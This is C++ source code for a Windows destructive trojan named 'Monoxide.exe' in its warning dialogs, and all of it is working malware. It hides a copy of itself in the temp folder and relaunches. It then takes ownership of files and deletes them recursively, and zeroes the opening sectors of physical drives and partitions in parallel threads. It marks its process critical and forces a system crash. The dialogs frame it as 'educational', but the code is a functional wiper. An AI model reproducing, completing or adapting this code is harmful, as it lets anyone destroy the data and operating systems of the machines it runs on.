#include <winternl.h>
#include <windows.h>
#include <iostream>
#include <cstdio>
#include <cstdint>
#include <cstring>
#include <vector>
#include <string>
#include <io.h>

#include "od.h"
#pragma warning(disable : 4996)
uint32_t Xorshift32()
{
    static uint32_t state = 2463534242u; // 可选：用任意非零种子初始化
    state ^= state << 13;
    state ^= state >> 17;
    state ^= state << 5;
    return state;
}
void GetRandomPath(wchar_t* szFileName, size_t length)
{
    static const wchar_t charset[] = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    size_t charsetSize = wcslen(charset);

    for (size_t i = 0; i < length; ++i)
    {
        szFileName[i] = charset[Xorshift32() % charsetSize];
    }
    szFileName[length] = L'\0';
}
void show() {
    //std::cout << show << std::endl;
}
static const size_t SECTOR_SIZE = 512;
long long FileNum = 0;
BOOL
WINAPI
ExecuteDropper(VOID)
{
    WCHAR szPath[MAX_PATH] = { 0 };
    WCHAR szNewPath[MAX_PATH] = { 0 };
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi;
    DWORD dwUnnamed;
    HANDLE hFile;

    GetModuleFileNameW(NULL, szPath, MAX_PATH);
start:
    GetTempPathW(MAX_PATH, szNewPath);

    if (wcsncmp(szPath, szNewPath, wcslen(szNewPath)))
    {
        WCHAR szFileName[17] = { 0 };
        GetRandomPath(szFileName, 16);
        wcscat_s(szNewPath, MAX_PATH, szFileName);
        wcscat_s(szNewPath, MAX_PATH, L".txt");

        if ((hFile = CreateFileW(szNewPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL)) == INVALID_HANDLE_VALUE)
        {
            RtlZeroMemory(szNewPath, MAX_PATH);
            goto start;
        }

        while (!WriteFile(hFile, szPath, MAX_PATH, &dwUnnamed, NULL))
        {
            Sleep(10);
        }

        CloseHandle(hFile);

        GetTempPathW(MAX_PATH, szNewPath);
        wcscat_s(szNewPath, MAX_PATH, szFileName);
        wcscat_s(szNewPath, MAX_PATH, L".exe");

        while (!CopyFileW(szPath, szNewPath, FALSE))
        {
            Sleep(10);
        }

        while (!SetFileAttributesW(szNewPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM))
        {
            Sleep(10);
        }

        si.cb = sizeof(si);
        CreateProcessW(szNewPath, NULL, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        return FALSE;
    }
    else
    {
        *wcsrchr(szPath, L'.') = 0;
        wcscat_s(szPath, MAX_PATH, L".txt");

        while ((hFile = CreateFileW(szPath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL)) == INVALID_HANDLE_VALUE)
        {
            Sleep(10);
        }

        while (!ReadFile(hFile, szNewPath, MAX_PATH, &dwUnnamed, NULL))
        {
            Sleep(10);
        }

        CloseHandle(hFile);

        while (!DeleteFileW(szPath))
        {
            Sleep(10);
        }

        while (!DeleteFileW(szNewPath))
        {
            Sleep(10);
        }

        if (MessageBoxW(NULL, L"WARNING!\n\nYou have ran a Trojan known as Monoxide.exe that has full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to run this?", L"Malware alert - Monoxide.exe", MB_ICONWARNING | MB_YESNO) != IDYES)
            return FALSE;
        if (MessageBoxW(NULL, L"FINAL WARNING!!!\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue? This is your final chance to stop this program from execution.", L"Malware alert - Monoxide.exe", MB_ICONWARNING | MB_YESNO) != IDYES)
            return FALSE;
    }

    return TRUE;
}
LPCWSTR overwrite[] = {
    L"\\\\.\\PhysicalDrive0",
    L"\\\\.\\PhysicalDrive1",
    L"\\\\.\\PhysicalDrive2",
    L"\\\\.\\C:",
    L"\\\\.\\D:",
    L"\\\\.\\E:",
    L"\\\\.\\Harddisk0Partition1",
    L"\\\\.\\Harddisk0Partition2",
    L"\\\\.\\Harddisk0Partition3",
    L"\\\\.\\Harddisk0Partition4",
    L"\\\\.\\Harddisk0Partition5",
    L"\\\\.\\Harddisk1Partition1",
    L"\\\\.\\Harddisk1Partition2",
    L"\\\\.\\Harddisk1Partition3",
    L"\\\\.\\Harddisk1Partition4",
    L"\\\\.\\Harddisk1Partition5",
    L"\\\\.\\Harddisk2Partition1",
    L"\\\\.\\Harddisk2Partition2",
    L"\\\\.\\Harddisk2Partition3",
    L"\\\\.\\Harddisk2Partition4",
    L"\\\\.\\Harddisk2Partition5"
};
const size_t nOverwrite = sizeof(overwrite) / sizeof(void*);

bool SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege, bool bEnablePrivilege) {
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValue(NULL, lpszPrivilege, &luid)) {
        return false;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege) {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else {
        tp.Privileges[0].Attributes = 0;
    }

    if (!AdjustTokenPrivileges(hToken, false, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        return false;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        return false;
    }

    return true;
}


bool TakeOwnership(LPTSTR lpszOwnFile) {
    bool bRetval = false;

    HANDLE hToken = NULL;
    PSID pSIDAdmin = NULL;
    PSID pSIDEveryone = NULL;
    PACL pACL = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuthWorld =
        SECURITY_WORLD_SID_AUTHORITY;
    SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
    #define NUM_ACES 2
    EXPLICIT_ACCESS ea[NUM_ACES];
    DWORD dwRes;

    if (!AllocateAndInitializeSid(&SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone)) {
        goto Cleanup;
    }

    if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin)) {
        goto Cleanup;
    }

    ZeroMemory(&ea, NUM_ACES * sizeof(EXPLICIT_ACCESS));

    ea[0].grfAccessPermissions = GENERIC_READ;
    ea[0].grfAccessMode = SET_ACCESS;
    ea[0].grfInheritance = NO_INHERITANCE;
    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea[0].Trustee.ptstrName = (LPTSTR)pSIDEveryone;

    ea[1].grfAccessPermissions = GENERIC_ALL;
    ea[1].grfAccessMode = SET_ACCESS;
    ea[1].grfInheritance = NO_INHERITANCE;
    ea[1].Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea[1].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
    ea[1].Trustee.ptstrName = (LPTSTR)pSIDAdmin;

    if (ERROR_SUCCESS != SetEntriesInAcl(NUM_ACES, ea, NULL, &pACL)) {
        goto Cleanup;
    }

    dwRes = SetNamedSecurityInfo(lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

    if (ERROR_SUCCESS == dwRes) {
        bRetval = true;
        goto Cleanup;
    }

    if (dwRes != ERROR_ACCESS_DENIED) {
        goto Cleanup;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        goto Cleanup;
    }

    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, true)) {
        goto Cleanup;
    }

    dwRes = SetNamedSecurityInfo(lpszOwnFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL);

    if (dwRes != ERROR_SUCCESS) {
        goto Cleanup;
    }

    if (!SetPrivilege(hToken, SE_TAKE_OWNERSHIP_NAME, false)) {
        goto Cleanup;
    }

    dwRes = SetNamedSecurityInfo(lpszOwnFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL);

    if (dwRes == ERROR_SUCCESS) {
        bRetval = true;
    }

Cleanup:

    if (pSIDAdmin)
        FreeSid(pSIDAdmin);

    if (pSIDEveryone)
        FreeSid(pSIDEveryone);

    if (pACL)
        LocalFree(pACL);

    if (hToken)
        CloseHandle(hToken);

    return bRetval;

}

void DestroyDirectory(LPWSTR Directory) {
    TakeOwnership(Directory);

    if (Directory[wcslen(Directory) - 1] != '\\' && wcslen(Directory) < 260) {
        lstrcat(Directory, L"\\");
    }

    WCHAR SearchDir[MAX_PATH] = { 0 };
    lstrcpy(SearchDir, Directory);
    lstrcat(SearchDir, L"*.*");

    WIN32_FIND_DATA findData;
    HANDLE hSearch = FindFirstFile(SearchDir, &findData);

    if (hSearch == INVALID_HANDLE_VALUE) {
        return;
    }
    else do {
        if (!lstrcmp(findData.cFileName, L".") || !lstrcmp(findData.cFileName, L"..") || findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
            continue;
        }

        WCHAR Path[MAX_PATH] = { 0 };
        lstrcpy(Path, Directory);
        lstrcat(Path, findData.cFileName);

        if (FileNum < LLONG_MAX) {
            FileNum++;
        }

        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            lstrcat(Path, L"\\");
            DestroyDirectory(Path);
            RemoveDirectory(Path);
        }
        else if (TakeOwnership(Path) && !(FileNum % 20)) {
            DeleteFile(Path);
        }
    } while (FindNextFile(hSearch, &findData));

    FindClose(hSearch);
}

void OverWrite(LPCWSTR Name) {
    HANDLE hFile = CreateFile(Name, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    unsigned char* EmptyData = (unsigned char*)LocalAlloc(LMEM_ZEROINIT, 512);
    DWORD dwUnused;
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    for (int i = 0; i < 50000; i++) {
        WriteFile(hFile, EmptyData, 512, &dwUnused, NULL);
    }
    CloseHandle(hFile);
}

void OverWriteDisk() {
    for (int i = 0; i < nOverwrite; i++) {
        CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(OverWrite), (PVOID)overwrite[i], 0, NULL);
        Sleep(10);
    }
}
void SetCriticalProcess() {
    HANDLE hToken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);

    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
    VOID(WINAPI * RtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN) = (VOID(WINAPI*)(BOOLEAN, PBOOLEAN, BOOLEAN))GetProcAddress(hNtdll, "RtlSetProcessIsCritical");
    VOID(WINAPI * RtlSetThreadIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN) = (VOID(WINAPI*)(BOOLEAN, PBOOLEAN, BOOLEAN))GetProcAddress(hNtdll, "RtlSetThreadIsCritical");

    SetPrivilege(hToken, SE_DEBUG_NAME, true);
    if (RtlSetProcessIsCritical && RtlSetThreadIsCritical) {
        RtlSetProcessIsCritical(true, NULL, false);
        RtlSetThreadIsCritical(true, NULL, false);
    }
}

void CrashWindows() {
    HMODULE hNtdll = LoadLibrary(L"ntdll.dll");
    VOID(*RtlAdjustPrivilege)(DWORD, DWORD, BOOLEAN, LPBYTE) = (VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    VOID(*NtRaiseHardError)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD) = (void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))GetProcAddress(hNtdll, "NtRaiseHardError");

    unsigned char unused1;
    long unsigned int unused2;

    if (RtlAdjustPrivilege && NtRaiseHardError) {
        RtlAdjustPrivilege(0x13, true, false, &unused1);
        NtRaiseHardError(0xdeaddead, 0, 0, 0, 6, &unused2);
    }

    FreeLibrary(hNtdll);

    ExitWindows();

    ExitProcess(0);
}